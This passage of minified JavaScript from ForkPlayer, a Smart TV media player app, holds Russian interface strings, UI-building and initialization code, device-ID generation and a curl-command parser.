дорожек нет","PustayaIliUdalSsilkaVK":"Пустая или удаленая ссылка ВК","Podtverdit":"Подтвердить","OzhidaiteNeskSec":"Ожидайте несколько секунд","NazhmExitEsheRazDlyaVihoda":"Нажмите EXIT еще раз для выхода","ViNeSmeniliPassRodKontrRekomendSm":"Вы не сменили пароль 0000!<br><i>Рекомендуем сменить пароль Родительского контроля для защиты от детей</i>","ParolDeistDk":"Пароль действует до выхода в стартовое меню! Не забудьте выйти в стартовое меню по окончанию","PoiskAudio":"Поиск аудиозаписей","Source code":"Исходный код","PoiskVideo":"Поиск видеозаписей","PoiskFoto":"Поиск фото (дост. без авторизации)","MoiAudio":"Мои аудиозаписи","MoiVideo":"Мои видеозаписи","Recomend":"Рекомендации","Popular":"Популярное","Druzya":"Друзья","Gruppi":"Группы","SetFon":"Установить как фон","Audio":"Аудиозаписи","PoiskPeople":"Поиск людей","Authorization":"Авторизация","My":"Мои","OshibkaAvtorizacii":"Ошибка авторизации","VashiDruzya":"Ваши друзья","VashiGruppi":"Ваши Группы","Uchastnikov":"Участников","byLogin":" по логину и паролю","byCode":" по коду","IdetUstanovkaVidgeta":"Идет установка виджета","Ustanovka":"Установка","vidgeta":"виджета","Razmer":"Размер","GB":"ГБ","MB":"МБ","KB":"КБ","Bait":"Байт","Vidget":"Виджет","Manually":"Вручную","Enter":"Введите","OpenWidget":"Открыть виджет","Open":"Открыть","InstallWidgetInSmartHub":"Если вы уверены, что это виджет для самсунг смарт тв, то нажмите ентер для установки","recomOpenFromSmartHub":"необходимо запускать с смартхаба","ForkPlayerByClosed":"ForkPlayer будет закрыт<br>Возможна работа не на весь экран, для полноценной работы","NoDevices":"Нет подключенных","Open":"Открыть","Sorting":"Сортировка","Archive":"Архив","Higher":"Самый верх","Top":"Верх","Bottom":"Низ","Lower":"Самый низ","TVmemory":"Внутренняя память","uzheEstVustanovlennih":"уже есть в установленных","uspeshnoUstanovlen":"успешно установлен","VnimanieSvobMesto":"Внимание! Убедитесь что в архиве находится именно виджет для самсунг смарт тв и достаточно свободного места","ViklIvklTVchtobiUv":"Выключите и включите ТВ чтоб увидеть","OshibkaUstanovki":"Ошибка установки","vSmHubVidgNaidDop":"в смартхаб!</b><br>Виджет вы найдете в приложениях в смартхабе, или в Дополнительные приложения (Серия F)","PustayaPapka":"Пустая папка","BlueKnProporcii":"<i>Изменение пропорций видео</i><br><span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> Синяя кнопка во время проигрывания видео","Zakrit":"Закрыть","NachatZanovo":"Начать заново","ZagruzhatListiMozhoS":"Загружать сюда листы с компьютера можно с помощью","Summa":"Сумма","Valuta":"Валюта","PlatSistema":"Платежная система","NaprimerVchera":"Например, вчера в","VvDatuPlatezha":"Введите дату и время платежа","ThanksForYou":"Спасибо за поддержку проекта","Ozhidanie":"Ожидание","Prinyato":"Обработка","Enter URL or search on":"Введите URL или выполните поиск по","Bookmark toolbar":"Панель закладок","NeobhodimRemoteFork":"Для выполнения этой операции необходимо запустить RemoteFork на компьютере или андроиде<br>Подробнее на forkplayer.tv","Translate":"Перевести страницу на ","Yazik":"Язык","OchistIst":"Очистить поле / историю","VVOD":"ВВОД","BistrijPoskVverh":"Быстр. поиск: Вверх","Vniz":"Вниз","Vibrat":"Выбрать","Documenti":"Документы","Photo":"Фотографии","fromPage":"со страницы","fromWall":"со стены","photo":"фото","Exit":"Выйти","SavedPhoto":"Сохраненные фотографии","Slideshow":"Слайдшоу","sec":"сек","Category":"КАТЕГОРИЯ","Categorys":"Категории","ForResetAppPressButton":"Для сброса настроек, нажмите сейчас кнопку","ALL":"ВСЕ","OpenFromProxy":"Запуск через прокси","PredpDor":"Предп. дорожка","InFullScreen":"На весь экран","Iread":"Я прочитал(а)","NotShow":"Больше не показывать","AudioMini":"Аудио мини","OffMiniPlayer":"Здесь можно отключить использование специального мини плеера для проигрывания mp3 файлов","ConnectToServer":"Соединение с сервером","NewDNS":"Доступен новый ДНС","From":"Отправитель","AutoSync":"Автосинхронизация","Mark":"Отметить","several":"несколько","existOverwrite":"существует! Перезаписать?","OverwriteAll":"Перезаписать все","SkipAll":"Пропустить все","Deselect":"Отменить выделение","Queue":"В очереди","DeleteFromStartMenu":"Удалить из стартового меню","Edit":"Редактировать","Rename":"Переименовать","Interface Setup":"Настройка интерфейса","ChangeURLicon":"Сменить адрес иконки","EnterURLicon":"Введите адрес иконки","Icon":"Иконка","SetIconFor":"Установить иконкой для","EnterTitle":"Введите название","SelectIcon":"Выбрать иконку","Timeout connection to stream IPTV":"Таймаут подключения к IPTV","SetDefaultStartMenu":"Сбросить настройки старт. меню","PreviousFileWillBeOverwritten":"Предыдущий архив настроек будет перезаписан","PressStopToCancel":"Нажмите Стоп для отмены","Show rating":"Рейтинг ссылок","Count":"Количество","Percent":"Проценты","Server":"Сервер","or Add search engine in settings":"или Добавьте поисковую систему в настройках","Show ratings and views of resources and playlists":"Показывать рейтинг и количество просмотров ресурсов и плейлистов","WhileCopyingFilesCannotViewVideoAndAudio":"Во время копирования файлов нельзя смотреть видео и аудио","NeedToOpenAndCloseTheVideoPlayerThenRepeatCopying":"Нужно открыть и закрыть это видео в плеере, потом повторить копирование"};function totranslit(text,engToRus){var rus="щ   ш  ч  ц  ю  я  ё  ж  ъ  ы  э  а б в г д е з и й к л м н о п р с т у ф х ь".split(/ +/g),eng="shh sh ch cz yu ya yo zh `` y' e` a b v g d e z i j k l m n o p r s t u f x `".split(/ +/g);var x;for(x=0;x<rus.length;x++){text=text.split(engToRus?eng[x]:rus[x]).join(engToRus?rus[x]:eng[x]);text=text.split(engToRus?eng[x].toUpperCase():rus[x].toUpperCase()).join(engToRus?rus[x].toUpperCase():eng[x].toUpperCase())}
return text}
if(typeof JSON!=="object"){JSON={}}
if(typeof Object.create==='undefined'){Object.create=function(o){function F(){}
F.prototype=o;return new F()}}
if(!Object.keys){Object.keys=(function(){'use strict';var hasOwnProperty=Object.prototype.hasOwnProperty,hasDontEnumBug=!({toString:null}).propertyIsEnumerable('toString'),dontEnums=['toString','toLocaleString','valueOf','hasOwnProperty','isPrototypeOf','propertyIsEnumerable','constructor'],dontEnumsLength=dontEnums.length;return function(obj){if(typeof obj!=='object'&&(typeof obj!=='function'||obj===null)){throw new TypeError('Object.keys called on non-object')}
var result=[],prop,i;for(prop in obj){if(hasOwnProperty.call(obj,prop)){result.push(prop)}}
if(hasDontEnumBug){for(i=0;i<dontEnumsLength;i++){if(hasOwnProperty.call(obj,dontEnums[i])){result.push(dontEnums[i])}}}
return result}}())}
function mh(s,i){if(handler=="menu"){if(getSelect()!=-s||omni_hor!=i){setSelect(-4);omniSel(i);linkOver()}}}
var init_style=0,inited=0;function faddStyle(styles){var head=document.getElementsByTagName('head')[0];if(!init_style&&head){var css=document.createElement('style');css.type='text/css';if(css.styleSheet)
css.styleSheet.cssText=styles;else css.appendChild(document.createTextNode(styles));head.appendChild(css);init_style=1}}
function init_styles(){faddStyle('#main{width:100%;height:100%;position:absolute;overflow:hidden;left:0px;top:0px;font-size:28px;cursor: default;} #QualCh{display: none; background-color: rgb(50, 60, 66); position: absolute; padding: 6px 2px; margin: 0px; left: 35%; top: 20%; border: 1px solid gray; width: 30%; height: auto; z-index: 2; overflow: hidden; font-size: 32px; border-radius: 7px;}'+'#vk{position:absolute;}'+'#popUp{display: none; position: absolute; top: 84%; left: 75%; text-align: left; width: 23%; overflow: hidden; font-size: 16px; color: rgb(118, 118, 118); background-color: rgb(252, 252, 254); padding: 6px; border-radius: 6px; border: 1px solid rgb(118, 118, 118); z-index: 3;}'+'#player{display: none; position: absolute; margin: 0px; width: 100%; height: 100%; left: 0px; top: 0px; padding: 0px; font-size: 26px; overflow: hidden;}'+'body{overflow: hidden; font-family: Georgia, Arial; font-size: 26px; color: rgb(238, 238, 238); margin: 0px; padding: 0px; width: 100%; height: 100%;}'+'object{width:0px;height:0px;}'+'.jwplayer{top: 0px; 	left:0px; 	position: absolute !important; z-index: 0 !important;} .video { position: absolute; padding-bottom: 56.25%; height: 0; overflow: hidden; }  .video iframe,   .video object,   .video embed {  position: absolute;  top: 0;  left: 0;  width: 100%;  height: 100%;}')}
init_styles();function initdiv(){try{if(inited)return;init_styles();if($_("MenuCh")!=null)$("#MenuCh").remove();lI1I1IxFCIh1l01llYpr("pr",''+'<div id="panel" style="width:100%;border-bottom:1px solid gray;background-color: #495255;">'+'<div id="top" style="color:rgb(238, 238, 238);width:100%; height: 34px;">'+'<div id="widgets" style="max-width: 310px; width:33%;height:100%;overflow:hidden;float:right;margin-right: '+css_w(5)+'px;">'+'<span id="widget_date" style="width: 62%;float: left;padding-top:2px;"></span>'+'<div id="widget_time" style="width: 35%;float:right;" title="Назад" onclick="tmf();"></div> '+'</div> '+'<div id="remote" style="padding-top: 3px;float:right;" title="Состояние вспомогательной компьютерной программмы Remote ForkPlayer"><img align="left" id="remotesrc" alt="R" title="Нажмите чтобы обновить состояние RemoteFork" height="24" width="24" src="'+_img("_ST_1px.png")+'" /><img align=left id="acesrc" width="24" height="24" src="'+_img("_ST_1px.png")+'" style="display:none;" /></div>'+'<div id="weather" style="padding-top: 1px;width:81px;height: 29px; overflow: hidden; display: block;float:right;"></div>'+'<div id="inset" style="width:auto;position: inherit;height:100%;overflow:hidden;float: none;padding: 0px 0px 0px 5px;margin: 0px;text-align:left;font-size:85%;white-space: nowrap;"></div>'+'</div><div id="textinfo" style="position: absolute; left: 23px; top: 0px; z-index: 0; background-color: black;"></div>'+'</div>'+'		'+'<div id="top2" style="margin: 0px;padding: 4px 10px 0px 10px;"></div>  '+'<div id="sidebar" style="height:25px; width:100%; display:none; overflow:hidden;padding:5px 3px 0px 3px; font-size:16px;"></div>'+'</div>         <iframe id="site" style="background:none;z-index:0;background-color:transparent;position:absolute;top:75px;left:0px;height:100%;width:100%;margin:0px; padding:0px; overflow:hidden;border:none;" allow="midi;encrypted-media;" sandbox="allow-scripts allow-same-origin" frameborder="0" '+'src=\'javascript:d=document;d.clear();\'></iframe>'+'<div id="MenuCh" style="position:absolute;z-index:1;display:none;padding:3px 7px 3px 7px;left:290px;border:1px solid gray;width:340px;height:auto;overflow:hidden;font-size:27px;border-radius:6px;background-color:#323c42;"></div>  '+'<div id="btdiv" style="position:absolute;top:96%;float:right;width:30%;height:30px;overflow:hidden;display:none;"></div>'+'<div id="quick_but" style="top: 82px; left: 1000px; display: none; padding: 2px; z-index: 1; color: black; background-color: rgb(250, 250, 250); font-size: 25px; position: absolute;"></div><div id="but_nav" style="width: 10px; height: 581px; top: 87px; left: 4px; padding: 2px; border-radius: 2px; display: none; position: absolute;"></div><div id="vk_play_button" onclick="keyHandler({keycode:VK_PLAY});" style="width: 30px; height: 35px; top: 95.5%; left: 95%; display: none; position: absolute; background-position: 0px -3px; background-image: url('+_img("_ST_audio_controls.png")+');"></div><div id="playermini" style="width: 420px; height: 267px; top: 453px; left: 860px; display: none; position: absolute; background-color: black;"></div>');var obh='<div id="kbuts">';for(var i=0;i<omniBut.length;i++){if(i==5)obh+='<div style="float:right;">';else dpp='';if(gV(omniBut[i],"quick")!="")var cl="<span id='bt"+i+"' style='border-radius:2px;position: absolute;padding: 4px; margin: "+css_wh(17)+"px;background: "+omniBut[i].quick+";'></span>";else cl="";if(omniBut[i].id=="top2text"){obh2='<div id="'+omniBut[i].id+'" onclick="'+omniBut[i].onclick+'" onmouseout="this.style.backgroundColor=\'#787d7e\';" onmouseover="this.style.backgroundColor=\'#888d8e\';" style="background-color:#787d7e;float:none;border-radius: 6px;border:2px solid transparent;padding:2px 0 0 6px;margin: 2px 5px 0px 0px;white-space: nowrap;overflow:hidden;"><div id="navigate" style="overflow: hidden;height:100%;margin-top:0px;margin-right: '+css_w(35)+'px;"></div></div>'}else obh+='<div id="'+omniBut[i].id+'" onclick="'+omniBut[i].onclick+'" onmouseout="" onmouseover="mh(-4,'+i+');" style="'+(i==5?'margin-left:-'+css_w(37)+'px;':'')+'border:2px solid transparent;float:left;height: '+css_w(28)+'px;border-radius: 50%;">'+cl+'<img id="'+(i==3?'page_load':'img'+omniBut[i].id)+'" style="padding:'+css_wh(4)+'px;width:'+css_w(20)+'px;height:'+css_wh(20)+'px;" src="'+_img(omniBut[i].img)+'" /></div>';if(i==6)obh+='</div>'}
obh+=obh2+'</div>';obh+='';lI1I1IxFCIh1l01llYpr("top2",obh);var bd=document.getElementsByTagName('body')[0];if(uaJ=="mag")bd.style.margin="10px 15px";bd.insertAdjacentHTML("beforeend",'<div id="statbar2" style="bottom: 0px; height: 20px; left: 0px; display: none; overflow: hidden; width: 100%; z-index: 1; font-size: 16px; position: absolute; white-space: nowrap; zoom: 100%;"></div></div><div id="ext" style="background: none; height: 640px; top: 43px; left: 0px; overflow: hidden; width: 100%; display: none; position: absolute;"></div><div id="scrsaver" onmousemove="screensavertimer=-1;screensaver_mod(0);" style="background: black; height: 0px; top: 0px; left: 0px; z-index: -1; width: 0px; display: none; position: absolute;"></div><div id="subtitle" style="width: 1200px; top: 545px; font-size: 40px; left: 40px; position: absolute; display: none; text-align: center; font-weight: bold; text-shadow: black -1px 0px, black 0px 1px, black 1px 0px, black 0px -1px;"></div><div id="bcg1" style="width: 100%; height: 63%; z-index: -1; top: 0px; left: 0px; display: none; position: absolute; background-repeat: repeat-y;"></div><div id="bcg2" style="width: 860px; height: 100%; z-index: -1; position: absolute; top: 0%; left: 0px; display: none;"></div><div id="whitestripes1" style="width: 100%; height: 0px; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; position: absolute;"></div><div id="whitestripes2" style="width: 100%; height: 0px; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; position: absolute;"></div>');var meta=document.createElement('meta');meta.name="referrer";meta.content="never";document.getElementsByTagName('head')[0].appendChild(meta);if(uaJ=="mag")$_("widget_time").style.fontWeight="normal";$_("player").insertAdjacentHTML("beforebegin",'<video id="video" style="width: 100%; height: 100%; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; margin: 0px; padding: 0px; position: fixed;"></video><div id="jw" style="width: 100%; height: 100%; background-color: black; z-index: 0; top: 0px; left: 0px; display: none; margin: 0px; padding: 0px; position: absolute;"></div>');lI1I1IxFCIh1l01llYpr("player",'<div id="prekinfo" style="float:left;padding:'+css_w(43)+'px 10px;display:none; color: #c5bfbf;	text-shadow: 		-0   -1px 0   #000000,		 0   -1px 0   #000000,		-0    1px 0   #000000,		 0    1px 0   #000000,		-1px -0   0   #000000,		 1px -0   0   #000000,		-1px  0   0   #000000,		 1px  0   0   #000000,		-1px -1px 0   #000000,		 1px -1px 0   #000000,		-1px  1px 0   #000000,		 1px  1px 0   #000000,		-1px -1px 0   #000000,		 1px -1px 0   #000000,		-1px  1px 0   #000000,		 1px  1px 0   #000000;"><b>PRE VIDEO INFORMATION</b><div id="rek_button1" onmouseover="rek_sel=0;rekBox();" onclick="rek_sel=0;keyHandler({keycode:VK_ENTER});}" style="max-width: 600px; max-height: 80px; overflow: hidden; top: 600px; padding: 7px; left: 40px; font-size: 22px; display: none; position: absolute; border: 2px solid rgb(197, 195, 195);"></div><div id="rek_button2" onmouseover="rek_sel=1;rekBox();" onclick="rek_sel=1;keyHandler({keycode:VK_ENTER});}" style="padding: 7px; top: 600px; max-width: 300px; left: 920px; font-size: 22px; display: none; max-height: 80px; overflow: hidden; position: absolute; border: 2px solid rgb(197, 195, 195);"></div></div>'+'<div id="pstream" style="width:85%;margin:4px;font-size:96%;text-align:left;color:#EEEEEE;position:absolute;	left:0px;	top:0px;">'+'<div style="float:left;"><div id="pstr" style="float:left;margin-top: 5px;"></div></div><div id="player_time" style="float:left;margin: 0px 4px;">'+$_("widget_time").innerHTML+' </div><div id="infR" style="float:left;    margin: 0px 4px;"></div><div id="infPl" style="float:left;    margin: 0px 4px;"></div></div>'+'<div id="buttonTop" style="float:right;margin-right:10px;"><div id="qual_text"></div>    <div id="exit_text"></div></div>'+'<div id="loading" style="text-align: center;display:none;margin-top:20%;"><img src="'+_img("_ST_b_loading.gif")+'"/></div>'+'<div id="playerBottom" style="position:absolute;top:78%;left:0px;width:100%;height:158px;">'+'<div id="arrowtime" style="color:black;margin-top: -22px;border-radius: 4px;margin-top: -22px;padding: 2px 6px;height: 22px;font-size: 19px;text-align: center;background-color: rgb(204, 204, 204);position: absolute;"></div>'+'<div id="progressBarClick" style="width:100%;height:12px;background-color:#cccccc;position: absolute;">'+'<div id="progressBarStatus" style="float:left;height:100%;background: #ad1c36;"> </div>'+'<div id="progressBall" style=" width: 20px;height: 20px;margin-top: -4px;background: #ad1c36;float: left; -moz-border-radius: 10px;border-radius: 10px;"></div>'+'<div id="progressBuffer" style="float: left;height: 100%;display:none;background-color:#ffcccc;"> </div>'+'</div>'+'<div style="background: '+rgba("rgba(17,19,19,0.56)")+';height: 86px;width: 100%;padding:4px 0px 0px 0px;margin-top:8px;">'+'<div style="width: 243px;padding-right: 12px;height: 23px;margin-top: 2px;font-size: 26px;color: rgb(203,0,32);float: right;text-align: right;"> <span id="remainingTime" style="color:rgb(255,255,255);"></span> <span id="totalTime" style=" color: #EEEEEE;"></span></div>'+'<div id="ptt" style="float: left;margin-top: -15px;margin-left: 13px;text-align: center;width: 98%;z-index: 2;color: #EEEEEE;clear: both;word-break: break-word;overflow: hidden;height: 80px;"></div>'+'<div id="epg_full" style="height: 78px;top: 19px; left: 25%; display: none;position: absolute;overflow: hidden;font-size: 22px;"></div> '+'</div>'+'<div id="buttonLayout" style="width:100%;text-align:center;padding:5px;background:'+rgba("rgba(17,19,19,0.44)")+'">'+'<div id="stop"></div>'+'<div id="play"></div>'+'<div id="rewind"></div><div id="forward"></div> <div id="option"></div> <div id="lastview"></div>  <div id="prev"> </div>'+'<div id="next"></div> '+'</div>'+'<div id="chat" style="width: 280px; height: 100%; top: 0px; left: 1000px; display: none; position: absolute; background-color: black;"></div><div id="thumb" style="top: 534px; left: 300px; width: 128px; height: 72px; overflow: hidden; display: none; padding: 2px; background-color: black; position: absolute;"></div>'+'</div>');for(var i in allPlayerButton){if(i=="play")var dop='<div id="recovery" onclick="trpt();" style="position:absolute;font-size:70%;text-align:center;"></div>';else dop='';$_(i).style.margin="2px 2px 0px 0px";$_(i).style.borderRadius="5px";$_(i).style.textAlign="center";$_(i).style.display="inline-block";if(allPlayerButton[i].row[1]==1)$_(i).style.width="10%";lI1I1IxFCIh1l01llYpr(i,dop+"<img align='center' style='margin:auto;width: 100%;max-width: 55px;height: 50px;' src='"+_img(allPlayerButton[i].img)+"' />")}
if(platform=="android-device"){var meta=document.createElement('meta');meta.name="viewport";meta.content="width=1280";document.getElementsByTagName('head')[0].appendChild(meta)}
FXMLPage.lIlO1OI1Mlt001lIYpr();inited=!0;console.log("OK INITED")}catch(e){console.log("ERR INITED");console.log(e);kjtYpr.popUp("Error 0 INITED: "+e.message)}}
var ext_player=!1,send,ptext="";var nupd=0;function initmain(){try{setInterval(function(){nupd++;if(timestamp<3&&nupd%2==1)return;if(user!=null&&handler!="player")autoexport("user");if(kjtYpr.GL.ts==1||TS)autoexport("timer")},180000);$_("main").focus();if(typeof kjtYpr.GL=="undefined")kjtYpr.setDefault(!0);if(typeof kjtYpr.GL.JTVRegion=="undefined")kjtYpr.setDefault(!0);console.log(kjtYpr.GL);kjtYpr.GL.buffer=2;kjtYpr.GL["zakladki.xml"]='_FPZakladki_ / _FPRaznoe_';kjtYpr.GL["zakladkiSerials.xml"]='_FPZakladki_ / _FPSeriali_';kjtYpr.GL["zakladkiFilms.xml"]='_FPZakladki_ / _FPFilmi_';kjtYpr.GL["zakladkiIPTV.xml"]='_FPZakladki_ / IPTV';if(kjtYpr.series=="C"||kjtYpr.series=="D")box_low2=!0;if($_("startlogo")!=null)$_("startlogo").style.display="none";$_("main").style.color=f_cols[kjtYpr.GL.color];kjtYpr.l01IlDLcE110l10Ypr="about:blank";if(uaJ=="lgw2"){if(kjtYpr.l1O0l1gmmv01O11YprC("v")!="1"){kjtYpr.lll0Il11OxICbl1ll0Ypr("settings",llIl1I1HlMgNII1IO0Ypr(kjtYpr.GL));kjtYpr.lll0Il11OxICbl1ll0YprC("v","1")}}
country=countries[kjtYpr.GL.country];kjtYpr.inf("_FPInicializaciya_ _FPpleera_");if(kjtYpr.l1O0l1gmmv01O11Ypr("xmodeClear")!="")kjtYpr.GL.clear=parseInt(kjtYpr.l1O0l1gmmv01O11Ypr("xmodeClear"));kjtYpr.inf(uaJ);ll0OOAolFIlI0I0Ypr();statusbar("_FPOzhidanie_ _FPmenu_..");l0OO0IigAAl011Ypr=Math.round(540-ch_size*1.6-llOII1OOGQQO00OYpr*1.2-12);lOIl1I10qn0xI0l11Ypr=null;enteresObj=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("enteres"));kjtYpr.lll0Il11OxICbl1ll0Ypr("searches","");userTop=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("datas"));if(enteresObj==null)enteresObj=[];if(userTop==null)userTop={};l1OII11MlI01IYpr=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("history"));if(l1OII11MlI01IYpr==null)l1OII11MlI01IYpr=[];var k=0,ln=l1OII11MlI01IYpr.length;for(var i=0;i<ln;i++){if(l1OII11MlI01IYpr[i-k]==null){l1OII11MlI01IYpr.splice(i-k,1);k++;continue}
if(typeof l1OII11MlI01IYpr[i-k].xml_url=="undefined"){l1OII11MlI01IYpr.splice(i-k,1);k++}}
console.log(l1OII11MlI01IYpr);ftimes=l0QO11lOz0bfh10l0Ypr(kjtYpr.l1O0l1gmmv01O11Ypr("times"));console.log("step 0");statusbar("_FPOzhidanie_ _FPmenu_...");var s=kjtYpr.l1O0l1gmmv01O11Ypr("epg_set");console.log(s);if(s!="")epg_arr=l0QO11lOz0bfh10l0Ypr(s);else epg_arr={};console.log("step 1");insetCount=0;booting=!1;if(kjtYpr.GL.recovery=="true"||kjtYpr.GL.recovery===!0||kjtYpr.GL.recovery==1){statusbar("_FPVozobnovlenie_");var stinset=-1;for(i=0;i<ll0I11QuIXO1OIYpr;i++){s=kjtYpr.l1O0l1gmmv01O11Ypr("url"+i);if(s!=""){if(l0QO11lOz0bfh10l0Ypr(s)!=null){oInset.push(OeInit(Inset));if(oInset[oInset.length-1].get("a")=="1")stinset=oInset.length-1}}}
if(oInset.length==0)oInset.push(OeInit(Inset));statusbar("_FPVozobnovlenie_.");if(stinset>-1)insetActive=stinset;else{insetActive=parseInt(kjtYpr.l1O0l1gmmv01O11Ypr("urlInset"))}
if(isNaN(insetActive))insetActive=0;else if(typeof oInset[insetActive]=='undefined')insetActive=oInset.length-1;insetCount=oInset.length;statusbar("_FPVozobnovlenie_..");renderInset();listInset();console.log(oInset[insetActive].INC);setTimeout("if(oInset[insetActive].INC==-1) oInset[insetActive].navigateHist(-1);",1000)}else{statusbar("_FPLoad Start page_");oInset.push(OeInit(Inset));console.log("step 2");kjtYpr.inf("");renderInset();insetCount=oInset.length;gotoStart()}
l0I1l1I10bl1F10lIOIYpr("autostart");try{if(!app_cors){xhrt2=null;xhrt2=new XMLHttpRequest();xhrt2.onreadystatechange=function(){if(xhrt2.readyState==4){if(xhrt2.status==200){app_cors_orig=app_cors=!0;app_cors_referer=0;ptext=encodeURIComponent(xhrt2.responseText.substring(0,1000))}}};xhrt2.open('GET',"http://staticdata.appinfo.su/staticfiles/cors.html",!0);xhrt2.send()}else ptext="no"}catch(e){console.log(e)}
setTimeout(function(){if(document.location.href.indexOf("operatv.obovse.ru")>0&&uaJ=="android"){kjtYpr.inf("_FPIt is recommended to use an android application_ Install apk application",1800)}},9000)}catch(e){console.log(e);kjtYpr.popUp("Err initmain:<br>"+e.message,5000)}
updateWeather()}
if(!document.getElementsByClassName){document.getElementsByClassName=function(cls,node,tag){if(!node)node=document;if(!tag)tag='*';var them=node.getElementsByTagName(tag),rez=[];for(var notI=0;notI<them.length;++notI)
if(them[notI].className==cls)rez.push(them[notI]);return rez}}
function pqrs(){console.log("pqrs");try{if(gV(kjtYpr,"mac").match(/(undefined|file not|file...not)/)){kjtYpr.lll0Il11OxICbl1ll0YprC("ID","");kjtYpr.lll0Il11OxICbl1ll0Ypr("ID","");kjtYpr.mac=undefined}
if(kjtYpr.mac==undefined){if(lg_uid.length>11){kjtYpr.mac=lg_uid;console.log("Mai n.mac==lg_uid "+lg_uid);model="lgusb"}else{kjtYpr.virtual=1;console.log("VIRT0="+kjtYpr.virtual);var s=kjtYpr.l1O0l1gmmv01O11YprC("ID");if(s!=""&&s.length>=12)kjtYpr.mac=s;else{s=kjtYpr.l1O0l1gmmv01O11Ypr("ID");if(s!=""&&s.length>=12)kjtYpr.mac=s}}
if(kjtYpr.mac!=undefined){if(kjtYpr.mac=="file%20not%20found."||kjtYpr.mac=="file not found."||kjtYpr.mac.length!=12)kjtYpr.mac=undefined}
if(kjtYpr.mac==undefined){console.log("Mai n.mac==undefined2");kjtYpr.popUp("Generate unique ID");var pref={"polaroid":"pd","finlux":"fn","telefunken":"tf","digihome":"dg","tizen":"st","smart-tv":"sa","toshiba":"t","hisense":"h","vestel":"et","android":"a","skyworth":"sk","viera":"pa","lg":"lg","philips":"ph","sony":"s","tcl":"tc"};var bid="";$.each(pref,function(i,val){if(ua.indexOf(i)!=-1&&bid=="")bid=val});var m=ua.match(/\(.*?\)/g);if(m!=null){$.each(m,function(i,val){var d=val.match(/([\d]+)/g);if(d!=null)bid+=d.join("")})}
kjtYpr.mac=(bid.substr(0,6)+reverseString(ip2long(ipG))+reverseString(Date.now())).substr(0,12);kjtYpr.popUp("First run generate unique ID<br>"+kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0YprC("ID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0Ypr("ID",kjtYpr.mac);return}else{kjtYpr.lll0Il11OxICbl1ll0YprC("ID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0Ypr("ID",kjtYpr.mac)}}else{kjtYpr.mac=kjtYpr.mac.replace("array()","");kjtYpr.mac=kjtYpr.mac.toLowerCase();if(platform=="sams")return;kjtYpr.lll0Il11OxICbl1ll0YprC("ID",kjtYpr.mac);kjtYpr.lll0Il11OxICbl1ll0Ypr("ID",kjtYpr.mac)}
if(kjtYpr.mac.match(/(;|:)/))kjtYpr.mac=kjtYpr.mac.substr(0,12);kjtYpr.mac=kjtYpr.mac.replace("array()","");kjtYpr.mac=kjtYpr.mac.toLowerCase();if(kjtYpr.serial==undefined)kjtYpr.serial=kjtYpr.mac;else if(kjtYpr.serial=="nonundefined"||kjtYpr.serial=="undefined")kjtYpr.serial=kjtYpr.mac;else if(kjtYpr.serial!=kjtYpr.mac){kjtYpr.lll0Il11OxICbl1ll0Ypr("IDS",kjtYpr.serial);kjtYpr.lll0Il11OxICbl1ll0YprC("IDS",kjtYpr.serial)}
var idS=kjtYpr.l1O0l1gmmv01O11Ypr("IDS");if(idS=="")idS=kjtYpr.l1O0l1gmmv01O11YprC("IDS");if(idS!=""&&kjtYpr.serial==kjtYpr.mac)kjtYpr.serial=idS;if(kjtYpr.serial=="nonundefined"||kjtYpr.serial=="undefined")kjtYpr.serial=kjtYpr.mac;oID=kjtYpr.l1O0l1gmmv01O11Ypr("oID");if(oID=="")oID=kjtYpr.l1O0l1gmmv01O11YprC("oID")}catch(e){console.log(e);kjtYpr.popUp("Error load step 2: "+e.message)}}
function nmlz(s){s=trim11(s.replace(/<.*?>/g," ").replace(/сезон \d+/i,"").replace(/серия \d+/i,"").replace(/[\(\):\/\-!\?,\.\|]/g," "));s=s.replace(/\s+/g," ");return s}
function totrim(s){return s.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,'')}
function trim11(str){str=str.replace(/^\s+/,'');for(var i=str.length-1;i>=0;i--){if(/\S/.test(str.charAt(i))){str=str.substring(0,i+1);break}}
return str}
function grm(min,max){return Math.floor(Math.random()*(max-min))+min}
function ParseError(message){this.message=message||"";this.name="ParseError"};ParseError.prototype=new Error;function shellwords(line){try{var words=_.map(line.split(/(\".*?\")/),function(block){var matches=block.match(/^\"(.*)\"$/);if(matches){return matches[1]}else{return block.split(/ +/)}});words=_.flatten(words);words=_.compact(words);if(_.detect(words,function(word){return word.match(/\"/)})){throw new ParseError("Unmatched quote")}
return words}catch(e){console.log(e);kjtYpr.popUp(e.message,2000)}}
parseCURL=function(s){console.log(s);if(0!=s.indexOf('curl '))return;s=s.replace(/\\"/g,"--uquote-");var args=rewrite(shellwords(s));var out={method:'GET',header:{}};var state='';args.forEach(function(arg){arg=arg.replace(/--uquote-/g,"\"");switch(!0){case isURL(arg):out.url=arg;break;case arg=='-A'||arg=='--user-agent':state='user-agent';break;case arg=='-H'||arg=='--header':state='header';break;case arg=='-d'||arg=='--data'||arg=='--data-ascii':state='data';break;case arg=='-u'||arg=='--user':state='user';break;case arg=='-I'||arg=='--head':out.method='HEAD';break;case arg=='-X'||arg=='--request':state='method';break;case arg=='-b'||arg=='--cookie':state='cookie';break;case arg=='--compressed':out.header['Accept-Encoding']=out.header['Accept-Encoding']||'deflate, gzip';break;case!!arg:switch(state){case 'header':var field=parseField(arg);field[1]=field[1];out.header[field[0]]=field[1];state='';break;case 'referer':out.header.Referer=arg;state='';break;case 'user-agent':out.header['User-Agent']=arg;state='';break;case 'data':if(out.method=='GET'||out.method=='HEAD')out.method='POST';out.header['Content-Type']=out.header['Content-Type']||'application/x-www-form-urlencoded';out.body=out.body?out.body+'&'+arg:arg;state='';break;case 'user':out.header.Authorization='Basic '+btoa(arg);state='';break;case 'method':out.method=arg;state='';break;case 'cookie':out.header['Set-Cookie']=arg;state='';break}
